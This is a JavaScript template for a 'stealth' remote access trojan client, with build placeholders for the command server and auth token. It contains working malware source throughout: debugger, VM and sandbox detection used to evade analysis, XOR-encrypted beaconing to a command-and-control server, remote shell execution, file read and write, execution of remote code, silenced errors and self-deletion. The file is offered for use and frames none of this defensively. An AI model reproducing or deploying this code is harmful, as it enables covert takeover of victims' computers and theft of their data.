// Stealth RAT Client Template
// Generated: __BUILD_TIME__
// Client ID: __CLIENT_ID__

(function() {
    'use strict';
    
    // Anti-analysis and stealth techniques
    const Stealth = {
        // Debug detection
        isDebugging() {
            try {
                // Check for devtools
                const devtools = /./;
                devtools.toString = function() {
                    this.opened = true;
                    return '';
                };
                console.log(devtools);
                console.clear();
                
                if (devtools.opened) return true;
                
                // Check for debugger statement
                const start = performance.now();
                debugger;
                const end = performance.now();
                
                if (end - start > 100) return true;
                
                return false;
            } catch (e) {
                return true;
            }
        },

        // Virtual machine detection
        isVM() {
            try {
                // Check for common VM indicators
                if (typeof process !== 'undefined') {
                    const { execSync } = require('child_process');
                    
                    try {
                        const bios = execSync('wmic bios get serialnumber', { encoding: 'utf8' });
                        if (bios.includes('VMware') || bios.includes('VirtualBox') || bios.includes('Xen')) {
                            return true;
                        }
                    } catch (e) {
                        // Command failed, might be VM or permissions issue
                    }

                    // Check MAC address vendors
                    try {
                        const mac = execSync('getmac /v', { encoding: 'utf8' });
                        if (mac.includes('00:0C:29') || mac.includes('08:00:27')) {
                            return true;
                        }
                    } catch (e) {
                        // Command failed
                    }
                }
                
                return false;
            } catch (e) {
                return false;
            }
        },

        // Sandbox detection
        isSandbox() {
            try {
                // Check for common sandbox artifacts
                if (typeof process !== 'undefined') {
                    // Check for analysis tools
                    const suspiciousProcesses = ['wireshark', 'fiddler', 'procmon', 'processhacker'];
                    const { execSync } = require('child_process');
                    
                    for (const proc of suspiciousProcesses) {
                        try {
                            execSync(`tasklist | findstr "${proc}"`, { encoding: 'utf8' });
                            return true;
                        } catch (e) {
                            // Process not found
                        }
                    }
                }
                
                return false;
            } catch (e) {
                return false;
            }
        },

        // Delay execution to evade dynamic analysis
        async randomDelay(min = 1000, max = 5000) {
            const delay = Math.random() * (max - min) + min;
            await new Promise(resolve => setTimeout(resolve, delay));
        },

        // String encryption/decryption
        encrypt(str) {
            return btoa(str.split('').map((char, i) => 
                String.fromCharCode(char.charCodeAt(0) + i + 1)
            ).join(''));
        },

        decrypt(str) {
            return atob(str).split('').map((char, i) => 
                String.fromCharCode(char.charCodeAt(0) - i - 1)
            ).join('');
        }
    };

    // Configuration (encrypted)
    const CONFIG = {
        serverUrl: '__SERVER_URL__',
        authToken: '__AUTH_TOKEN__',
        clientId: '__CLIENT_ID__',
        heartbeatInterval: 30000, // Longer intervals for stealth
        maxRetries: 5,
        retryDelay: 60000,
        stealth: true
    };

    // State
    let isRunning = false;
    let retryCount = 0;
    let lastCommandId = null;
    let communicationKey = null;

    // Advanced utilities
    const Utils = {
        decode: __OBFUSCATE__ ? Stealth.decrypt : (str) => str,
        generateId: () => crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substr(2, 9),
        sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
        
        // Encrypted communication
        async encryptedRequest(url, data = null) {
            const headers = {
                'Content-Type': 'application/json',
                'X-Client-ID': CONFIG.clientId,
                'User-Agent': this.getRandomUserAgent()
            };

            if (communicationKey) {
                headers['X-Comm-Key'] = communicationKey;
            }

            const options = {
                method: data ? 'POST' : 'GET',
                headers: headers
            };

            if (data) {
                // Simple XOR encryption for data
                const encryptedData = this.xorEncrypt(JSON.stringify(data), communicationKey || CONFIG.authToken);
                options.body = JSON.stringify({ data: encryptedData });
            }

            try {
                const response = await fetch(url, options);
                const result = await response.json();
                
                // Decrypt response if encrypted
                if (result.data) {
                    result.data = JSON.parse(this.xorDecrypt(result.data, communicationKey || CONFIG.authToken));
                }
                
                return result;
            } catch (error) {
                throw new Error(`Encrypted request failed: ${error.message}`);
            }
        },

        xorEncrypt(str, key) {
            let result = '';
            for (let i = 0; i < str.length; i++) {
                result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
            }
            return btoa(result);
        },

        xorDecrypt(encrypted, key) {
            const str = atob(encrypted);
            let result = '';
            for (let i = 0; i < str.length; i++) {
                result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
            }
            return result;
        },

        getRandomUserAgent() {
            const userAgents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
            ];
            return userAgents[Math.floor(Math.random() * userAgents.length)];
        },

        getSystemInfo() {
            const info = {
                platform: typeof navigator !== 'undefined' ? navigator.platform : process.platform,
                userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Node.js',
                language: typeof navigator !== 'undefined' ? navigator.language : 'en',
                timestamp: Date.now(),
                clientId: CONFIG.clientId,
                screen: typeof screen !== 'undefined' ? {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                } : null
            };

            if (typeof process !== 'undefined') {
                info.nodeVersion = process.version;
                info.arch = process.arch;
                info.pid = process.pid;
                info.memory = process.memoryUsage();
                info.uptime = process.uptime();
            }

            return info;
        },

        async executeCommand(command, parameters = {}) {
            console.log(`[STEALTH-RAT] Executing: ${command}`);
            
            // Add random delay for stealth
            await Stealth.randomDelay(500, 2000);
            
            let result = null;
            let error = null;

            try {
                switch (command) {
                    case 'system_info':
                        result = Utils.getSystemInfo();
                        break;

                    case 'stealth_check':
                        result = {
                            debugging: Stealth.isDebugging(),
                            vm: Stealth.isVM(),
                            sandbox: Stealth.isSandbox(),
                            timestamp: Date.now()
                        };
                        break;

                    case 'establish_key':
                        if (parameters.key) {
                            communicationKey = parameters.key;
                            result = { status: 'key_established', key: communicationKey };
                        } else {
                            error = 'No key provided';
                        }
                        break;

                    case 'screenshot':
                        result = { 
                            status: 'screenshot_requested',
                            note: 'Stealth screenshot capture requires specialized libraries'
                        };
                        break;

                    case 'file_operations':
                        if (typeof process !== 'undefined') {
                            const fs = require('fs');
                            const path = require('path');
                            
                            switch (parameters.operation) {
                                case 'list':
                                    const dir = parameters.path || process.cwd();
                                    const files = fs.readdirSync(dir);
                                    result = { 
                                        directory: dir,
                                        files: files.map(file => {
                                            const filePath = path.join(dir, file);
                                            const stats = fs.statSync(filePath);
                                            return {
                                                name: file,
                                                size: stats.size,
                                                isDirectory: stats.isDirectory(),
                                                modified: stats.mtime,
                                                hidden: file.startsWith('.')
                                            };
                                        })
                                    };
                                    break;
                                    
                                case 'read':
                                    try {
                                        const content = fs.readFileSync(parameters.path, 'utf8');
                                        result = { 
                                            path: parameters.path,
                                            content: content,
                                            size: content.length
                                        };
                                    } catch (e) {
                                        error = `Failed to read file: ${e.message}`;
                                    }
                                    break;
                                    
                                case 'write':
                                    try {
                                        fs.writeFileSync(parameters.path, parameters.content, 'utf8');
                                        result = { 
                                            path: parameters.path,
                                            status: 'written',
                                            size: parameters.content.length
                                        };
                                    } catch (e) {
                                        error = `Failed to write file: ${e.message}`;
                                    }
                                    break;
                                    
                                default:
                                    error = 'Unknown file operation';
                            }
                        } else {
                            error = 'File operations not supported in browser';
                        }
                        break;

                    case 'shell':
                        if (typeof process !== 'undefined') {
                            const { execSync } = require('child_process');
                            try {
                                // Execute with timeout and capture both stdout and stderr
                                const output = execSync(parameters.command, { 
                                    encoding: 'utf8',
                                    timeout: 30000,
                                    stdio: ['pipe', 'pipe', 'pipe']
                                });
                                result = {
                                    command: parameters.command,
                                    output: output,
                                    exitCode: 0
                                };
                            } catch (e) {
                                result = {
                                    command: parameters.command,
                                    output: e.stdout || '',
                                    error: e.stderr || e.message,
                                    exitCode: e.status || 1
                                };
                            }
                        } else {
                            error = 'Shell commands not supported in browser';
                        }
                        break;

                    case 'persistence':
                        result = { 
                            status: 'persistence_requested',
                            note: 'Stealth persistence requires elevated privileges'
                        };
                        break;

                    case 'custom_script':
                        if (parameters.code) {
                            try {
                                // Execute in isolated context
                                const func = new Function('params', 'Stealth', 'Utils', parameters.code);
                                result = func(parameters, Stealth, Utils);
                            } catch (e) {
                                error = `Script execution failed: ${e.message}`;
                            }
                        } else {
                            error = 'No code provided';
                        }
                        break;

                    case 'self_destruct':
                        result = { status: 'self_destruct_initiated' };
                        isRunning = false;
                        
                        // Attempt to remove traces
                        if (typeof process !== 'undefined') {
                            try {
                                const fs = require('fs');
                                fs.unlinkSync(process.execPath);
                            } catch (e) {
                                // Failed to remove executable
                            }
                        }
                        break;

                    default:
                        error = `Unknown command: ${command}`;
                }
            } catch (e) {
                error = `Command execution failed: ${e.message}`;
            }

            return { result, error, commandId: lastCommandId };
        },

        async sendResponse(responseData) {
            try {
                const response = await Utils.encryptedRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/response`,
                    responseData
                );
                console.log('[STEALTH-RAT] Response sent successfully');
                return response;
            } catch (error) {
                console.error('[STEALTH-RAT] Failed to send response:', error.message);
                throw error;
            }
        },

        async heartbeat() {
            try {
                const response = await Utils.encryptedRequest(
                    `${CONFIG.serverUrl}/.netlify/functions/heartbeat`
                );

                if (response.status === 'command_pending') {
                    console.log('[STEALTH-RAT] Received command:', response.command);
                    lastCommandId = response.command.id;
                    
                    const result = await Utils.executeCommand(
                        response.command.command, 
                        response.command.parameters
                    );
                    
                    await Utils.sendResponse(result);
                } else {
                    console.log('[STEALTH-RAT] Heartbeat acknowledged');
                }

                retryCount = 0;
                return response;
            } catch (error) {
                console.error('[STEALTH-RAT] Heartbeat failed:', error.message);
                retryCount++;
                
                if (retryCount >= CONFIG.maxRetries) {
                    console.error('[STEALTH-RAT] Max retries reached, stopping');
                    isRunning = false;
                }
                
                throw error;
            }
        }
    };

    // Main execution with stealth checks
    async function start() {
        console.log(`[STEALTH-RAT] Initializing...`);
        
        // Perform stealth checks
        if (Stealth.isDebugging()) {
            console.log('[STEALTH-RAT] Debug environment detected, exiting');
            return;
        }

        if (Stealth.isVM()) {
            console.log('[STEALTH-RAT] VM environment detected, exiting');
            return;
        }

        if (Stealth.isSandbox()) {
            console.log('[STEALTH-RAT] Sandbox environment detected, exiting');
            return;
        }

        // Random delay before starting
        await Stealth.randomDelay(2000, 8000);

        // Decode configuration if obfuscated
        if (__OBFUSCATE__) {
            CONFIG.serverUrl = Utils.decode(CONFIG.serverUrl);
            CONFIG.authToken = Utils.decode(CONFIG.authToken);
        }

        console.log(`[STEALTH-RAT] Client starting...`);
        console.log(`[STEALTH-RAT] Client ID: ${CONFIG.clientId}`);
        console.log(`[STEALTH-RAT] Server: ${CONFIG.serverUrl}`);
        
        isRunning = true;

        while (isRunning) {
            try {
                await Utils.heartbeat();
                await Utils.sleep(CONFIG.heartbeatInterval + Math.random() * 10000); // Randomize interval
            } catch (error) {
                console.error('[STEALTH-RAT] Main loop error:', error.message);
                await Utils.sleep(CONFIG.retryDelay + Math.random() * 30000); // Randomize retry delay
            }
        }

        console.log('[STEALTH-RAT] Client stopped');
    }

    // Error handling with stealth
    if (typeof process !== 'undefined') {
        process.on('uncaughtException', (error) => {
            // Silent error handling to avoid detection
        });

        process.on('unhandledRejection', (reason, promise) => {
            // Silent error handling
        });

        process.on('SIGINT', () => {
            isRunning = false;
        });

        process.on('SIGTERM', () => {
            isRunning = false;
        });
    }

    // Start the client
    if (typeof module === 'undefined') {
        start();
    } else {
        start();
    }
})();
